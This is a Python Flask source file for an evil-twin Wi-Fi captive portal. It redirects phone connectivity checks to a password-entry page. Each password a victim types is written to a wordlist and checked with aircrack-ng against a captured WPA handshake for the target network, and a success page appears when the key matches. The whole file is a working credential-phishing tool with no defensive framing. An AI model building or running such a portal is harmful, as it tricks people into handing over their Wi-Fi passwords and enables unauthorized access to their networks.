import subprocess
import sys

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
is_debug = len(sys.argv) != 3
bssid = str(sys.argv[1])


# android: generate_204 gen_204
# ios: /hotspot-detect.html
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for("index"))


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        entered_password = request.form.get("password")

        with open("wordlist.txt", "w") as f:
            f.write(entered_password + "\n")

        result = subprocess.run(
            [
                "aircrack-ng",
                "-w",
                "wordlist.txt",
                "-b",
                bssid,
                "handshake.cap",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        if "KEY FOUND!" in result.stdout.decode():
            return render_template("success.html")

    return render_template("index.html")


if __name__ == "__main__":
    app.run(
        debug=is_debug,
        host="127.0.0.1" if is_debug else str(sys.argv[2]),
        port=5000 if is_debug else 80,
    )
